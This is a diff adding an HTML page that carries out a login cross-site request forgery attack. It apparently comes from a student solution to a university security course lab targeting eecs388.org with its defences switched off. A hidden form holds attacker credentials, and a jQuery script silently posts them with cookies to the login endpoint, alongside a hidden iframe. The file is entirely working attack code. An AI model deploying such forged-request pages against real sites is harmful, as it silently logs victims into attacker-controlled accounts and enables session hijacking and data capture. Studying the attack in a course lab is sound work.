@@ -1,0 +1,19 @@
+<html><body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    <form id="form1" method="post" action="https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4" style="display:
+    none">
+      <input name="username" value="attacker">
+      <input name="password" value="l33th4x">
+    </form>
+    <script>
+            // How to send a post request using html and javascript with jQuery.
+            $.ajax({
+            type: 'POST',
+            data: $('#form1').serialize(),
+            url: "https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4",
+            xhrFields: {withCredentials: true} // Necessary if you want to send and set cookies
+            });
+    </script>
+    <iframe name = "hiddenFrame" style ="display: none"></iframe>
+</body></html>
+ 
